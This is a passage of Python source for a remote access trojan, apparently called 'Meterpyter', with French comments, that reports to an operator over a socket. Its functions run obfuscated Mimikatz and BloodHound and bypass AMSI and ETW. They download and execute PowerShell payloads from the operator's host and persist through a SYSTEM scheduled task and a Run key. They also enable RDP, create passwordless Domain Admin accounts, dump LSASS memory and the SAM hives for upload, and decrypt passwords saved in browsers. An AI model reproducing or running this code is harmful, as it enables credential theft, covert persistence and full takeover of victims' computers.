            payload = f"""$path = "{current_path}\\Invoke-GodPotato.ps1";. $path; Invoke-GodPotato {module_args}"""
        if powershell_proc and powershell_proc.poll() is None:
            try:
                powershell_proc.stdin.write(payload.encode('utf-8') + b"\r\n")
                powershell_proc.stdin.flush()
            except Exception as e:
                s.send(f"[GODPOTATO] Error: {e}\n".encode('utf-8'))
        else:
            s.send(b"[!POWERSHELL] No active PowerShell session. Use 'powershell' first.\n")
        s.send(chariot + b"[GODPOTATO] GodPotato execution done.\n" + chariot)

def Run_Obf_Pwsh_Module(module_name, module_args=""):
    global powershell_proc
    current_path = os.getcwd()
    if module_name == "mimikatz":
        s.send(chariot + b"[MIMIKATZ] Running obfuscated Mimikatz to retrieve credentials...\n")
        if mimikatztoexecute is not None:
            payload = f"""$path = "{mimikatztoexecute}";. $path; Invoke-Jinx {module_args}"""
        else :
            payload = f"""$path = "{current_path}\\Obf-Invoke-Jinx.ps1";. $path; Invoke-Jinx {module_args}"""
        if powershell_proc and powershell_proc.poll() is None:
            try:
                powershell_proc.stdin.write(payload.encode('utf-8') + b"\r\n")
                powershell_proc.stdin.flush()
            except Exception as e:
                s.send(f"[MIMIKATZ] Error: {e}\n".encode('utf-8'))
        else:
            s.send(b"[!POWERSHELL] No active PowerShell session. Use 'powershell' first.\n")

    elif module_name == "amsi":
        s.send(chariot + b"[AMSIBYPASS] Running AMSI Bypass in current PowerShell session...\n")
        if amsitoexecute is not None:
            payload = f"""$path = "{amsitoexecute}";& $path"""
        else:
            payload = f"""$path = "{current_path}\\amsibypass.ps1";& $path"""
        if powershell_proc and powershell_proc.poll() is None:
            try:
                powershell_proc.stdin.write(payload.encode('utf-8') + b"\r\n")
                powershell_proc.stdin.flush()
            except Exception as e:
                s.send(f"[AMSIBYPASS] Error: {e}\n".encode('utf-8'))
        else:
            s.send(b"[!POWERSHELL] No active PowerShell session. Use 'powershell' first.\n")
        s.send(chariot + b"[AMSIBYPASS] AMSI Bypass done.\n" + chariot)
    elif module_name == "etw":
        s.send(chariot + b"[ETWBYPASS] Running ETW Bypass...\n")
        if etwtoexecute is not None:
            payload = f"""$path = "{etwtoexecute}";& $path"""
        else:
            payload = f"""$path = "{current_path}\\etwbypass.ps1";& $path"""
        if powershell_proc and powershell_proc.poll() is None:
            try:
                powershell_proc.stdin.write(payload.encode('utf-8') + b"\r\n")
                powershell_proc.stdin.flush()
            except Exception as e:
                s.send(f"[ETWBYPASS] Error: {e}\n".encode('utf-8'))
        else:
            s.send(b"[!POWERSHELL] No active PowerShell session. Use 'powershell' first.\n")
        s.send(chariot + b"[ETWBYPASS] ETW Bypass done.\n" + chariot)
    elif module_name == "bloodhound":
        s.send(chariot + b"[BLOODHOUND] Running obfuscated BloodHound enumeration...\n")
        if bloodhoundtoexecute is not None:
            payload = f"""$path = "{bloodhoundtoexecute}";. $path; Invoke-Jinxhound {module_args}; remove-item ./*.bin -Force"""
        else:
            payload = f"""$path = "{current_path}\\SHARPHOUND\\Obf-Invoke-Jinxhound.ps1";. $path; Invoke-Jinxhound -CollectionMethods all -OutputDirectory $pwd '{module_args}'; remove-item ./*.bin -Force"""
        if powershell_proc and powershell_proc.poll() is None:
            try:
                powershell_proc.stdin.write(payload.encode('utf-8') + b"\r\n")
                powershell_proc.stdin.flush()
            except Exception as e:
                s.send(f"[BLOODHOUND] Error: {e}\n".encode('utf-8'))
        else:
            s.send(b"[!POWERSHELL] No active PowerShell session. Use 'powershell' first.\n")

def Load_Run_Memory_Pwsh_Module(module_name, module_args=""): # NOT WORKING RN
    current_path = os.getcwd()
    if module_name == "mimikatz":
        payload = f"""
        $url = "http://{myip}/download/MIMIKATZ/pwsh/Invoke-Mimikatz.ps1"
        Invoke-Expression (New-Object Net.Webclient).DownloadString("$url")
        Invoke-Mimikatz {module_args}
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADMEMORYPWSHMODULE] Mimikatz module loaded in memory.\n" + chariot)
    elif module_name == "rubeus":
        payload = f"""
        $url = "http://{myip}/download/RUBEUS/pwsh/Invoke-Rubeus.ps1"
        Invoke-Expression (New-Object Net.Webclient).DownloadString("$url")
        Invoke-Rubeus {module_args}
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADMEMORYPWSHMODULE] Rubeus module loaded in memory.\n" + chariot)
    elif module_name == "sauroneye":
        payload = f"""
        $url = "http://{myip}/download/SAURONEYE/pwsh/Invoke-SauronEye.ps1"
        Invoke-Expression (New-Object Net.Webclient).DownloadString("$url")
        Invoke-SauronEye {module_args}
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADMEMORYPWSHMODULE] SauronEye module loaded in memory.\n" + chariot)

def Load_Run_Obf_Memory_Pwsh_Module(module_name, module_args=""): # NOT WORING RN
    if module_name == "mimikatz":
        payload = f"""
        $url = "http://{myip}/download/MIMIKATZ/obf-pwsh/Obf-Invoke-Jinx.ps1"
        Invoke-Expression (New-Object Net.Webclient).DownloadString("$url")
        Invoke-Jinx {module_args}
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADOBFMEMORYPWSHMODULE] Obfuscated Mimikatz module loaded in memory.\n" + chariot)
        s.send(output + chariot)

# ============================================
# FONCTIONS - SURVEILLANCE UTILISATEUR
# ============================================

# Capture un screenshot de l'écran de la victime et l'upload
def Take_Screenshot(AppData_Path_Screen):
    sleep(1)
    s.send(chariot + b"[SCREENSHOT] Taking screenshot of victim screen...\n")
    filename = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".png"
    if not os.path.exists(AppData_Path_Screen):
        os.makedirs(AppData_Path_Screen)
    filepath = os.path.join(AppData_Path_Screen, filename)
    screenshot = pyautogui.screenshot(filepath)
    s.send(f"[SCREENSHOT] Screenshot saved to {filepath}\n".encode('utf-8'))
    Upload_File(filepath)

# ============================================
# FONCTIONS - PERSISTENCE
# ============================================

# Ajoute une tâche planifiée pour exécuter le RAT au démarrage (SYSTEM)
def Add_Scheduled():
    s.send(chariot + b"[ADDSCHEDULE] Adding scheduled task..." + chariot)
    user = getpass.getuser()
    path_to_persistence = "C:\\Users\\" + user + "\\Downloads"
    url = f"http://{myip}/download/Meterpyter.exe"
    destination = path_to_persistence + "\\Meterpyter.exe"
    payload = f'''
    $cmd = @"
Invoke-WebRequest -Uri {url} -OutFile {destination} -UseBasicParsing;
Start-Process -FilePath {destination}
"@

    # Encodage UTF-16LE -> Base64 pour -EncodedCommand
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
    $enc   = [Convert]::ToBase64String($bytes)

    $action    = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $enc"
    $trigger   = New-ScheduledTaskTrigger -AtLogOn
    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

    Register-ScheduledTask -TaskName "METERPYTER_PERSISTENCE" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force
    '''

    results = subprocess.Popen(
        ["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload],
        stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW
    )
    s.send(b"[ADDSCHEDULE] Scheduled task added." + chariot + chariot)

# Ajoute une entrée dans la clé de registre Run pour persistence utilisateur
def Add_Startup():
    s.send(chariot + b"[ADDSTARTUP] Adding startup entry... (Not implemented)" + chariot)
    Regedit_Path = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    user = os.getlogin()
    path_to_persistence = "C:\\Users\\" + user + "\\Downloads"
    url = f"http://{myip}/download/Meterpyter.exe"
    destination = path_to_persistence + "\\Meterpyter.exe"
    payload = f"""    
    Invoke-WebRequest -Uri {url} -OutFile {destination}
    Set-ItemProperty -Path "{Regedit_Path}" -Name "METERPYTER_PERSISTENCE" -Value "{destination}"
    """
    results = subprocess.Popen(
        ["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload],
        stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW
    )
    s.send(b"[ADDSTARTUP] Startup entry added." + chariot + chariot)


def Turn_RDP_On_Off(On_Off):
    if On_Off == "on":
        s.send(chariot + b"[RDPON] Enabling RDP on the victim machine..." + chariot)
        # Permet d'activer les connexions RDP et d'ouvrir le firewall pour le groupe "Remote Desktop"
        # Le groupe "Remote Desktop" contient les utilisateurs autorisés suivants par défaut : "Administrateurs", "Utilisateurs du bureau à distance" et "Utilisateurs du bureau à distance (pré-Windows 2000)"
        payload = '''
        Set-ItemProperty -Path "HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server" -Name "fDenyTSConnections" -Value 0
        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
        '''
        results = subprocess.Popen(
            ["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload],
            stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW
        )
        s.send(b"[RDPON] RDP enabled." + chariot + chariot)
    elif On_Off == "off":
        s.send(chariot + b"[RDPOFF] Disabling RDP on the victim machine..." + chariot)
        payload = '''
        Remove-ItemProperty -Path "HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server" -Name "fDenyTSConnections" -ErrorAction SilentlyContinue
        Disable-NetFirewallRule -DisplayGroup "Remote Desktop"
        '''
        results = subprocess.Popen(
            ["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload],
            stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW
        )
        s.send(b"[RDPOFF] RDP disabled." + chariot + chariot)
    

def Create_User(cmd, username, password):
    FR_or_EN = subprocess.Popen(
        ["powershell", "-Command", "Get-Culture | Select-Object -ExpandProperty Name"],
        stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW
    )
    if FR_or_EN.stdout.read().strip() == b"fr-FR":
        domain_group_name = "Admins du domaine"
        local_group_name = "Administrateurs"
    else:
        domain_group_name = "Domain Admins"
        local_group_name = "Administrators"

    if cmd == "createlocaluser":
        if password == "nopass" or password == "":
            s.send(chariot + f"[CREATEUSER] Creating local user '{username}'...".encode('utf-8') + chariot)
            # doing this with cmd with a complexity policy bypass
            payload = f'''
            net user {username} /add /active:yes /passwordreq:no 
            '''
            # debug
            print(f"Payload for creating local user:\n{payload}")
            results = subprocess.Popen(
                ["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload],
                stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW
            )
        else:
            s.send(chariot + f"[CREATEUSER] Creating local user '{username}' with password...".encode('utf-8') + chariot)
            payload = f'''
            net user {username} {password} /add /active:yes
            '''
            results = subprocess.Popen(
                ["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload],
                stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW
            )
        if results.returncode != 0:
            s.send(f"[CREATEUSER] Failed to create local user '{username}' : Might not have administrative privileges.\n".encode('utf-8'))
            return
        else:
            s.send(f"[CREATEUSER] Local user '{username}' created and added to {local_group_name} group.".encode('utf-8') + chariot + chariot)
    elif cmd == "createdomainuser":
        # Vérifier si l'OS est en français ou en anglais 
        
        if password == "nopass" or password == "":
            s.send(chariot + f"[CREATEUSER] Creating domain user '{username}'...".encode('utf-8') + chariot)
            payload = f'''
            net user {username} /add /active:yes /passwordreq:no /domain
            net group "{domain_group_name}" {username} /add /domain
            '''
            results = subprocess.Popen(
                ["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload],
                stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW
            )
        else:
            s.send(chariot + f"[CREATEUSER] Creating domain user '{username}' with password...".encode('utf-8') + chariot)
            payload = f'''
            net user {username} {password} /add /active:yes /domain
            net group "{domain_group_name}" {username} /add /domain
            '''
            results = subprocess.Popen(
                ["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload],
                stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW
            )
        if results.returncode != 0:
            s.send(f"[CREATEUSER] Failed to create domain user '{username}' : Might not have administrative privileges or not connected to a domain.\n".encode('utf-8'))
            return
        else:
            s.send(f"[CREATEUSER] Domain user '{username}' created and added to {domain_group_name} group.".encode('utf-8') + chariot + chariot)

def RDP_Group_Add(username):
    FR_or_EN = subprocess.Popen(
        ["powershell", "-Command", "Get-Culture | Select-Object -ExpandProperty Name"],
        stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW
    )
    if FR_or_EN.stdout.read().strip() == b"fr-FR":
        RDP_group_name = "Utilisateurs du Bureau à distance"
    else:
        RDP_group_name = "Remote Desktop Users"
    s.send(chariot + f"[RDPGROUPADD] Adding user '{username}' to {RDP_group_name} group...".encode('utf-8') + chariot)
    payload = f'''
    net localgroup "{RDP_group_name}" {username} /add
    '''
    results = subprocess.Popen(
        ["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload],
        stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW
    )
    if results.returncode != 0:
        s.send(f"[RDPGROUPADD] Failed to add user '{username}' to {RDP_group_name} group : Might not have administrative privileges.\n".encode('utf-8'))
        return
    else:
        s.send(f"[RDPGROUPADD] User '{username}' added to {RDP_group_name} group.".encode('utf-8') + chariot + chariot)

def Admin_Group_Add(method, username):
    FR_or_EN = subprocess.Popen(
        ["powershell", "-Command", "Get-Culture | Select-Object -ExpandProperty Name"],
        stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW
    )
    if FR_or_EN.stdout.read().strip() == b"fr-FR":
        domain_group_name = "Admins du domaine"
        local_group_name = "Administrateurs"
    else:
        domain_group_name = "Domain Admins"
        local_group_name = "Administrators"
    
    if method == "local":
        s.send(chariot + f"[ADMINGROUPADD] Adding user '{username}' to {local_group_name} group...".encode('utf-8') + chariot)
        payload = f'''
        net localgroup "{local_group_name}" {username} /add
        '''
        results = subprocess.Popen(
            ["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload],
            stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW
        )
        if results.returncode != 0:
            s.send(f"[ADMINGROUPADD] Failed to add user '{username}' to {local_group_name} group : Might not have administrative privileges.\n".encode('utf-8'))
            return
        else:
            s.send(f"[ADMINGROUPADD] User '{username}' added to {local_group_name} group.".encode('utf-8') + chariot + chariot)
    elif method == "domain":
        s.send(chariot + f"[ADMINGROUPADD] Adding user '{username}' to {domain_group_name} group...".encode('utf-8') + chariot)
        payload = f'''
        net group "{domain_group_name}" {username} /add /domain
        '''
        results = subprocess.Popen(
            ["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload],
            stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW
        )
        if results.returncode != 0:
            s.send(f"[ADMINGROUPADD] Failed to add user '{username}' to {domain_group_name} group : Might not have administrative privileges or not connected to a domain.\n".encode('utf-8'))
            return
        else:
            s.send(f"[ADMINGROUPADD] User '{username}' added to {domain_group_name} group.".encode('utf-8') + chariot + chariot)



# ============================================
# FONCTIONS - GESTION PROCESSUS
# ============================================

# Liste tous les processus en cours avec PID, nom et utilisateur
def Process_List():
    import psutil
    process_list = []
    for proc in psutil.process_iter(['pid', 'name', 'username']):
        process_list.append({
            'PID': proc.info['pid'],
            'Name': proc.info['name'],
            'User': proc.info['username']
        })
    
    # Format with aligned columns
    header = f"{'PID':<10} {'Name':<50} {'User':<30}"
    process_list.append(header)
    
    lines = [header]
    for proc in process_list:
        if isinstance(proc, dict):
            line = f"{proc['PID']:<10} {proc['Name']:<50} {proc['User']:<30}"
            lines.append(line)
    
    process_info = "\n".join(lines)
    s.send(chariot + process_info.encode('utf-8') + chariot)

# Dump la mémoire d'un processus par PID (non implémenté)
def Dump_Process_Memory(pid):
    s.send(chariot + f"Dumping memory of process with PID {pid}... (Not implemented)".encode('utf-8') + chariot)

# ============================================
# FONCTIONS - CREDENTIAL DUMPING
# ============================================

# Récupère le PID du processus LSASS
def get_lsass_pid():
    import psutil
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'].lower() == 'lsass.exe':
            return proc.info['pid']
    return None

# Dump complet de la mémoire LSASS pour extraction offline des credentials (mimikatz/pypykatz)
def Lsa_Dump():
    s.send(chariot + b"[LSADUMP] Dumping LSASS process...\n")
    
    try:
        import ctypes
        from ctypes import wintypes
        
        # CRITIQUE: Réappliquer l'impersonation SYSTEM sur ce thread
        if not Ensure_System_Privileges():
            s.send(b"[LSADUMP] WARNING: No SYSTEM token available.\n")
            s.send(b"[LSADUMP] Run 'getsystem' first for better success rate.\n")
        else:
            s.send(b"[LSADUMP] SYSTEM privileges applied to this thread.\n")

        # Confirm that we are SYSTEM

        Whoami()
        # Trouver le PID de LSASS
        pid = get_lsass_pid()
        if not pid:
            s.send(b"[LSADUMP] Could not find LSASS PID.\n" + chariot)
            return
        
        s.send(f"[LSADUMP] Found LSASS PID: {pid}\n".encode('utf-8'))
        
        # Ouvrir le processus avec tous les droits
        PROCESS_ALL_ACCESS = 0x1F0FFF
        kernel32 = ctypes.windll.kernel32
        dbghelp = ctypes.windll.dbghelp
        
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not h_process:
            s.send(b"[LSADUMP] Failed to open LSASS process.\n" + chariot)
            return
        
        # Créer le fichier dump
        PC_Name = os.environ['COMPUTERNAME']
        dump_path = os.path.join(os.getcwd(), f"lsass_{PC_Name}.dmp")
        h_file = kernel32.CreateFileW(
            dump_path,
            0x40000000,  # GENERIC_WRITE
            0,
            None,
            2,  # CREATE_ALWAYS
            0x80,  # FILE_ATTRIBUTE_NORMAL
            None
        )
        
        if h_file == -1:
            s.send(b"[LSADUMP] Failed to create dump file.\n" + chariot)
            kernel32.CloseHandle(h_process)
            return
        else:
            s.send(f"[LSADUMP] Dump file created: {dump_path}\n".encode('utf-8'))
        
        # Créer un dump mémoire complet du processus LSASS
        # MiniDumpWithFullMemory (0x02) : inclut toutes les sections mémoire accessibles
        # Cela capture les credentials en clair, tickets Kerberos, hashes NTLM, etc.
        # Le dump peut ensuite être parsé offline avec pypykatz ou mimikatz
        s.send(b"[LSADUMP] Writing dump with MiniDumpWithFullMemory flag...\n" + chariot)
        MiniDumpWithFullMemory = 0x00000002
        success = dbghelp.MiniDumpWriteDump(
            h_process,      # Handle du processus LSASS
            pid,            # PID du processus
            h_file,         # Handle du fichier de destination
            MiniDumpWithFullMemory,  # Type de dump (mémoire complète)
            None,           # Pas d'informations exception
            None,           # Pas d'informations utilisateur
            None            # Pas de callback
        )
        
        # Fermer les handles immédiatement pour libérer les ressources
        kernel32.CloseHandle(h_file)
        kernel32.CloseHandle(h_process)
        
        # Attendre que Windows libère complètement le fichier
        sleep(2)
        
        if success:
            s.send(f"[LSADUMP] LSASS dump created: {dump_path}\n".encode('utf-8'))
            s.send(b"[LSADUMP] Upload this file and parse with pypykatz or mimikatz offline.\n")
            s.send(b"[LSADUMP] Command: pypykatz lsa minidump lsass.dmp\n" + chariot)
            
            # Upload et suppression seulement si le dump a réussi
            try:
                #ZIP_Upload(dump_path)
                #sleep(1)
                #os.remove(dump_path)
                s.send(b"[LSADUMP] Dump file uploaded and removed.\n" + chariot)
            except Exception as cleanup_error:
                s.send(f"[LSADUMP] Cleanup error: {cleanup_error}\n".encode('utf-8') + chariot)
        else:
            s.send(b"[LSADUMP] MiniDumpWriteDump failed.\n" + chariot)

    except Exception as e:
        s.send(f"[LSADUMP] Error: {e}\n".encode('utf-8') + chariot)

# Exporte les ruches SAM, SYSTEM et SECURITY du registre pour extraction de hash offline
def Sam_Dump():
    s.send(chariot + b"[SAMDUMP] Dumping SAM database...\n")
    
    try:
        # Chemins temporaires pour les exports
        PC_name = os.environ['COMPUTERNAME']
        temp_dir = os.path.join(os.getcwd(), f"sam_dump_{PC_name}")
        if not os.path.exists(temp_dir):
            os.makedirs(temp_dir)
        
        sam_path = os.path.join(temp_dir, "SAM")
        system_path = os.path.join(temp_dir, "SYSTEM")
        security_path = os.path.join(temp_dir, "SECURITY")
        
        s.send(b"[SAMDUMP] Exporting registry hives...\n")
        
        # Exporter la ruche SAM
        result_sam = subprocess.run(
            ["reg", "save", "HKLM\\SAM", sam_path, "/y"],
            capture_output=True,
            text=True,
            creationflags=CREATE_NO_WINDOW
        )
        
        if result_sam.returncode != 0:
            s.send(f"[SAMDUMP] Failed to save SAM: {result_sam.stderr}\n".encode('utf-8'))
            return
        
        s.send(b"[SAMDUMP] SAM hive exported.\n")
        
        # Exporter la ruche SYSTEM
        result_system = subprocess.run(
            ["reg", "save", "HKLM\\SYSTEM", system_path, "/y"],
            capture_output=True,
            text=True,
            creationflags=CREATE_NO_WINDOW
        )
        
        if result_system.returncode != 0:
            s.send(f"[SAMDUMP] Failed to save SYSTEM: {result_system.stderr}\n".encode('utf-8'))
            return
        
        s.send(b"[SAMDUMP] SYSTEM hive exported.\n")
        
        # Exporter la ruche SECURITY (optionnel, pour LSA secrets)
        result_security = subprocess.run(
            ["reg", "save", "HKLM\\SECURITY", security_path, "/y"],
            capture_output=True,
            text=True,
            creationflags=CREATE_NO_WINDOW
        )
        
        if result_security.returncode == 0:
            s.send(b"[SAMDUMP] SECURITY hive exported.\n")
        
        s.send(b"[SAMDUMP] Registry hives exported successfully!\n")
        s.send(f"[SAMDUMP] Files saved in: {temp_dir}\n".encode('utf-8'))
        s.send(b"[SAMDUMP] Upload these files and parse offline with:\n")
        s.send(b"[SAMDUMP]   - impacket-secretsdump -sam SAM -system SYSTEM LOCAL\n")
        s.send(b"[SAMDUMP]   - pypykatz registry --sam SAM system SYSTEM\n")
        s.send(b"[SAMDUMP]   - mimikatz: lsadump::sam /sam:SAM /system:SYSTEM\n" + chariot)
        
        ZIP_Upload(temp_dir)
        sleep(1)
        shutil.rmtree(temp_dir, ignore_errors=True)
    except Exception as e:
        s.send(f"[SAMDUMP] Error: {e}\n".encode('utf-8') + chariot)

# Extrait les credentials stockés dans les navigateurs (Chrome, Edge, Firefox)
def Dump_Navigators_Credentials():
    s.send(chariot + b"[BROWSERDUMP] Dumping browser stored credentials...\n")
    
    try:
        import sqlite3
        import json
        import base64
        import shutil
        from Crypto.Cipher import AES
        import win32crypt
        
        user = os.getlogin()
        credentials = []
        
        # Chemins des bases de données des navigateurs
        browsers = {
            "Chrome": os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Default\Login Data"),
            "Edge": os.path.join(os.environ['LOCALAPPDATA'], r"Microsoft\Edge\User Data\Default\Login Data"),
            "Brave": os.path.join(os.environ['LOCALAPPDATA'], r"BraveSoftware\Brave-Browser\User Data\Default\Login Data"),
            "Opera": os.path.join(os.environ['APPDATA'], r"Opera Software\Opera Stable\Login Data"),
        }
        
        # Fonction pour déchiffrer les mots de passe Chrome/Edge (DPAPI)
        def decrypt_password(encrypted_password, key=None):
            try:
                # Vérifier si le password est vide ou None
                if not encrypted_password:
                    return ""
                
                # Vérifier la longueur minimale
                if len(encrypted_password) < 3:
                    return "[EMPTY]"
                
                # Chrome v80+ utilise AES encryption avec une clé maître
                if encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11':
                    if key is None:
                        return "[NO_MASTER_KEY]"
                    
                    # Vérifier qu'il y a assez de données
                    if len(encrypted_password) < 15:
                        return "[MALFORMED_V10]"
                    
                    # Extraire le nonce et le ciphertext
                    nonce = encrypted_password[3:15]
                    ciphertext = encrypted_password[15:]
                    
                    # Déchiffrer avec AES-GCM
                    cipher = AES.new(key, AES.MODE_GCM, nonce)
                    decrypted = cipher.decrypt(ciphertext)
                    # Le dernier bloc contient le tag GCM (16 bytes)
                    return decrypted[:-16].decode('utf-8', errors='ignore')
                else:
                    # Ancien format Chrome (DPAPI seulement)
                    # Vérifier que ce sont bien des données DPAPI valides
                    if len(encrypted_password) < 5:
                        return "[TOO_SHORT]"
                    
                    decrypted_data = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                    return decrypted_data.decode('utf-8', errors='ignore')
            except Exception as e:
                return f"[DECRYPT_FAILED]"
        
        # Fonction pour récupérer la clé de chiffrement maître de Chrome
        def get_master_key(browser_path):
            try:
                local_state_path = os.path.join(os.path.dirname(os.path.dirname(browser_path)), "Local State")
                if not os.path.exists(local_state_path):
                    return None
                    
                with open(local_state_path, 'r', encoding='utf-8') as f:
                    local_state = json.load(f)
                
                encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                encrypted_key = encrypted_key[5:]  # Retirer le préfixe "DPAPI"
                master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                return master_key
            except Exception:
                return None
        
        # Parcourir chaque navigateur
        for browser_name, db_path in browsers.items():
            if not os.path.exists(db_path):
                continue
            
            s.send(f"[BROWSERDUMP] Scanning {browser_name}...\n".encode('utf-8'))
            
            try:
                # Copier la DB car elle peut être verrouillée
                temp_db = os.path.join(os.getcwd(), f"temp_{browser_name}_logins.db")
                shutil.copy2(db_path, temp_db)
                
                # Récupérer la clé maître
                master_key = get_master_key(db_path)
                if master_key:
                    s.send(f"[BROWSERDUMP] Master key found for {browser_name}\n".encode('utf-8'))
                else:
                    s.send(f"[BROWSERDUMP] No master key for {browser_name} (will use DPAPI fallback)\n".encode('utf-8'))
                
                # Connexion SQLite
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                # Extraire les credentials
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                results = cursor.fetchall()
                s.send(f"[BROWSERDUMP] Found {len(results)} entries in {browser_name} database\n".encode('utf-8'))
                
                for row in results:
                    url = row[0]
                    username = row[1]
                    encrypted_password = row[2]
                    
                    # Ne traiter que les entrées avec username OU password
                    if username or encrypted_password:
                        password = decrypt_password(encrypted_password, master_key)
                        
                        # Afficher tous les credentials (même ceux qui ont échoué)
                        credentials.append({
                            "Browser": browser_name,
                            "URL": url,
                            "Username": username if username else "[NO_USERNAME]",
                            "Password": password if password else "[NO_PASSWORD]"
                        })
                
                conn.close()
                os.remove(temp_db)
                
            except Exception as e:
                s.send(f"[BROWSERDUMP] Error scanning {browser_name}: {e}\n".encode('utf-8'))
                if os.path.exists(temp_db):
                    os.remove(temp_db)
                continue
        
        # Firefox credentials (format JSON)
        firefox_profile_path = os.path.join(os.environ['APPDATA'], r"Mozilla\Firefox\Profiles")
        if os.path.exists(firefox_profile_path):
            s.send(b"[BROWSERDUMP] Scanning Firefox...\n")
            try:
                for profile in os.listdir(firefox_profile_path):
                    logins_path = os.path.join(firefox_profile_path, profile, "logins.json")
                    if os.path.exists(logins_path):
                        with open(logins_path, 'r', encoding='utf-8') as f:
                            logins_data = json.load(f)
                        
                        for login in logins_data.get("logins", []):
                            credentials.append({
                                "Browser": "Firefox",
                                "URL": login.get("hostname", ""),
                                "Username": login.get("encryptedUsername", "[Encrypted]"),
                                "Password": login.get("encryptedPassword", "[Encrypted - Requires NSS decryption]")
                            })
            except Exception as e:
                s.send(f"[BROWSERDUMP] Error scanning Firefox: {e}\n".encode('utf-8'))
        
        # Envoyer les résultats
        if credentials:
            s.send(chariot + f"[BROWSERDUMP] Found {len(credentials)} stored credentials:\n".encode('utf-8'))
            s.send(b"=" * 80 + chariot)
            
            for cred in credentials:
                output = f"""
Browser: {cred['Browser']}
URL: {cred['URL']}
Username: {cred['Username']}
Password: {cred['Password']}
{'-' * 80}
"""
                s.send(output.encode('utf-8'))
            
            # Sauvegarder dans un fichier et l'upload
            dump_file = os.path.join(os.getcwd(), "browser_credentials.txt")
            with open(dump_file, 'w', encoding='utf-8') as f:
                for cred in credentials:
                    f.write(f"Browser: {cred['Browser']}\n")
                    f.write(f"URL: {cred['URL']}\n")
